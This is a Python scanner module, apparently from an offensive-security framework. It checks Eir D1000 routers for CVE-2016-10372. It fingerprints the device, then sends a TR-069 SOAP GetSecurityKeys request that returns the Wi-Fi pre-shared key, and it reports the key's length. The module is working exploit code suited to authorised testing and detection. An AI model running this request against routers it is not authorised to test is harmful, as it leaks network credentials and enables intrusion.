#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eir D1000 CWMP WLAN key disclosure (CVE-2016-10372 soft check)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Eir D1000 - CWMP WLAN Key Disclosure Detection (CVE-2016-10372)',
        'description': (
            'Soft-detects Eir D1000 CWMP exposure by confirming /globe fingerprint then '
            'calling GetSecurityKeys and extracting NewPreSharedKey (Mirai-era TR-069 RCE chain).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2016', 'eir', 'd1000', 'cwmp', 'tr069', 'info-leak', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential_leak', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2016-10372',
        ],
        'cve': 'CVE-2016-10372',
    }

    def run(self):
        g = self.http_request(method='GET', path='/globe', allow_redirects=False)
        if not g or g.status_code != 404 or 'home_wan.htm' not in (g.text or ''):
            return False
        xml = (
            '<?xml version="1.0"?>'
            '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
            'SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
            '<SOAP-ENV:Body>'
            '<u:GetSecurityKeys xmlns:u="urn:dslforum-org:service:WLANConfiguration:1">'
            '</u:GetSecurityKeys>'
            '</SOAP-ENV:Body></SOAP-ENV:Envelope>'
        )
        r = self.http_request(
            method='POST',
            path='/UD/act?1',
            data=xml,
            headers={
                'Content-Type': 'text/xml',
                'SOAPAction': 'urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys',
            },
            allow_redirects=False,
        )
        if not r:
            return False
        m = re.search(r'<NewPreSharedKey>([^<]+)</NewPreSharedKey>', r.text or '')
        if m:
            self.set_info(
                severity='critical',
                reason=f'Eir D1000 CWMP WLAN key disclosure (len={len(m.group(1))})',
                path='/UD/act?1',
            )
            return True
        return False
